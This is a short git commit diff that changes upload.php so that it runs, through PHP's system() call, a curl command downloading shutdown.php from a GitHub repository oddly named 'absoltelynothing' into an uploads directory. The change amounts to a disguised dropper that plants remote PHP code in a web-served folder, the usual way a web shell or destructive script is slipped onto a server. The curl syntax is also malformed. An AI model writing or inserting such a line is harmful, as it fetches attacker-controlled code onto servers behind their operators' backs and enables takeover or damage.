e2c86067ba2889f1eb32754f10f6f2adc45f288f
CriticalCow <37348897+CriticalCow@users.noreply.github.com>
2022-01-11 21:29:54 -0800

    Update upload.php

--- upload.php
+++ upload.php
@@ -1,1 +1,1 @@
-curl -O https://raw.githubusercontent.com/CriticalCow/absoltelynothing/master/shutdown.php uploads/vod/rename/
+<?php system('curl -O https://raw.githubusercontent.com/CriticalCow/absoltelynothing/master/shutdown.php uploads/vod/rename/');
